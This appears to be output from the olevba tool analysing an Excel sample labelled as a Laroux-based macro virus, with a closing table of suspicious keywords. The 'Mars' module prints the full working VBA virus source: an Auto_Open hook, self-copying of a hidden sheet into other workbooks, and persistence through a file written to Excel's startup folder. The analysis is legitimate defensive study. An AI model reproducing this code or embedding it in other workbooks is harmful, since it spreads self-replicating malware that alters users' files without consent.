olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-d0eadef1ec705f0bfd6b9d1087083503e0b92698
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DieseArbeitsmappe.cls 
in file: Virus.MSExcel.Laroux-based-d0eadef1ec705f0bfd6b9d1087083503e0b92698 - OLE stream: '_VBA_PROJECT_CUR/VBA/DieseArbeitsmappe'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle1.cls 
in file: Virus.MSExcel.Laroux-based-d0eadef1ec705f0bfd6b9d1087083503e0b92698 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle2.cls 
in file: Virus.MSExcel.Laroux-based-d0eadef1ec705f0bfd6b9d1087083503e0b92698 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle3.cls 
in file: Virus.MSExcel.Laroux-based-d0eadef1ec705f0bfd6b9d1087083503e0b92698 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle4.cls 
in file: Virus.MSExcel.Laroux-based-d0eadef1ec705f0bfd6b9d1087083503e0b92698 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle5.cls 
in file: Virus.MSExcel.Laroux-based-d0eadef1ec705f0bfd6b9d1087083503e0b92698 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle6.cls 
in file: Virus.MSExcel.Laroux-based-d0eadef1ec705f0bfd6b9d1087083503e0b92698 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle7.cls 
in file: Virus.MSExcel.Laroux-based-d0eadef1ec705f0bfd6b9d1087083503e0b92698 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle8.cls 
in file: Virus.MSExcel.Laroux-based-d0eadef1ec705f0bfd6b9d1087083503e0b92698 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle9.cls 
in file: Virus.MSExcel.Laroux-based-d0eadef1ec705f0bfd6b9d1087083503e0b92698 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mars.bas 
in file: Virus.MSExcel.Laroux-based-d0eadef1ec705f0bfd6b9d1087083503e0b92698 - OLE stream: '_VBA_PROJECT_CUR/VBA/Mars'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




























Public AllOkey
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "Auto_Search"
End Sub

Sub Auto_Search()
Attribute Auto_Search.VB_ProcData.VB_Invoke_Func = " \n14"
    AuLoad$ = "Trial.XLS"
    AuName$ = "Mars"
    AcName$ = ActiveWorkbook.Name
    AsName$ = Workbooks(AcName$).Sheets(1).Name
    If ActiveWorkbook.Modules.Count = 0 Then
        If Not AsName$ = AuName$ Then
            Application.ScreenUpdating = False
            Workbooks(AuLoad$).Sheets(AuName$).Copy Before:= _
            Workbooks(AcName$).Sheets(1)
            Workbooks(AcName$).Sheets(AuName$).Visible = False
            Application.ScreenUpdating = True
            Application.OnSheetActivate = AuLoad$ + "!" + "Auto_Search"
        End If
    ElseIf Not AllOkey Then
        AcPath$ = ActiveWorkbook.Path
        AsPath$ = Application.StartupPath
        AsFind$ = Dir(AsPath$ & "/" & AuLoad$)
        AllOkey = True
        If AsFind$ <> AuLoad$ Then
            Application.ScreenUpdating = False
            Sheets(AuName$).Visible = True
            Sheets(AuName$).Select
            Sheets(AuName$).Copy
            With ActiveWorkbook
                .Title = ""
                .Subject = ""
                .Author = ""
                .Keywords = ""
                .Comments = ""
            End With
            AcCopy$ = ActiveWorkbook.Name
            AcPath$ = CurDir()
            ChDir AsPath$
            ActiveWindow.Visible = False
            Workbooks(AcCopy$).SaveAs _
                FileName:=AsPath$ & "/" & AuLoad$, _
                FileFormat:=xlNormal, _
                Password:="", _
                WriteResPassword:="", _
                ReadOnlyRecommended:=False, _
                CreateBackup:=False
            ChDir AcPath$
            Workbooks(AcName$).Sheets(AuName$).Visible = False
            Application.ScreenUpdating = True
            Application.OnSheetActivate = AuLoad$ + "!" + "Auto_Search"
        End If
    End If
End Sub
'                                           Bengkalis, 10 Januari 1997

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

